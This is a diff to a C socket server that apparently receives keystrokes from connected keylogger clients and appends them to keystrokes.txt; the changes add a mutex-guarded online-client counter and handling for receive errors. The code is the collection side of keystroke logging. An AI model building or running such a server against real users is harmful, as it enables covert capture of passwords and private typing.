@@ -27,8 +27,8 @@ int client_sockets[MAX_CLIENTS];
 // Mutual Exclusive Lock for shared file descriptor.
 pthread_mutex_t mutexFD = PTHREAD_MUTEX_INITIALIZER;
 
-// Shared file descriptor for logging keystrokes.
-int file_D;
+// Shared file descriptor for logging keystrokes and number of clients online.
+int file_D, numOfClients;
 
 // Struct to store client.
 typedef struct
@@ -106,7 +106,10 @@ int main(int argc, char *argv[])
     int client_sock, pthread;
     pthread_t client_thread;
     
-    int numOfClients = 0;
+    // Initialize number of clients online to 0.
+    pthread_mutex_lock(&mutexFD);
+    numOfClients = 0;
+    pthread_mutex_unlock(&mutexFD);
 
     file_D = open("keystrokes.txt", O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
 
@@ -131,7 +134,11 @@ int main(int argc, char *argv[])
 
         // Store connected client's socket in the client_sockets array.
         client_sockets[numOfClients] = client_sock;
+
+        // Increment number of clients online.
+        pthread_mutex_lock(&mutexFD);
         numOfClients += 1;
+        pthread_mutex_unlock(&mutexFD);
 
         printf("[#] Clients Online =>[%d]\n", numOfClients);
 
@@ -186,16 +193,39 @@ void *handle_client(void *args)
     ssize_t bytes_received;
 
     // Receive client message and echo it back.
-    while ((bytes_received = recv(client->client_socket, buffer,
-                                  sizeof(buffer) - 1, 0)) > 0)
+    while (1)
     {
+        bytes_received = recv(client->client_socket, buffer,
+                                  sizeof(buffer) - 1, 0); 
         if (bytes_received == 0)
         {
             fprintf(stderr, "[-] Client! [DISCONNECTED]\n");
+
+            // Decrement number of clients online.
+            pthread_mutex_lock(&mutexFD);
+            numOfClients -= 1;
+            pthread_mutex_unlock(&mutexFD);
+
+            // Clean up resources.
             close(client->client_socket);
             free(client);
             return NULL;
         }
+        else if (bytes_received < 0)
+        {
+            fprintf(stderr, "[x] Receive! [FAILED]\n");
+            
+            // Decrement number of clients online.
+            pthread_mutex_lock(&mutexFD);
+            numOfClients -= 1;
+            pthread_mutex_unlock(&mutexFD);
+
+            // Clean up resources.
+            close(client->client_socket);
+            free(client);
+            return NULL;
+        }
+
         buffer[bytes_received] = '\0';
 
         // Format the client keystrokes for logging.
